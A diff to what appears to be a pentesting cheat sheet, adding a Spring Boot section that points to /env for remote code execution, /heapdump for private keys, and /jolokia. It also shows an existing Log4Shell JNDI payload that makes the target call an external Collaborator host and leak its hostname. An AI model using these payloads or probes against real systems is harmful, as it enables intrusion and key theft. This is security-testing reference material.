@@ -55,6 +55,7 @@
 - [Webmin](#webmin)
 - [Broken Link Hijacking](#broken-link-hijacking)
 - [Log4Shell](#log4shell)
+- [Spring Boot](#spring-boot)
 
 
 ## SQL Injection
@@ -1629,5 +1630,12 @@ Resources:
 ## Log4Shell
 
 - Payload: `Referer: ${jndi:ldap://h${hostname}.BURPCOLLABORATOR/s2test}`
+
+
+
+## Spring Boot
+
+- Check `/env` for RCE, `/heapdump` for private keys
+- Check also `/jolokia`
 
 
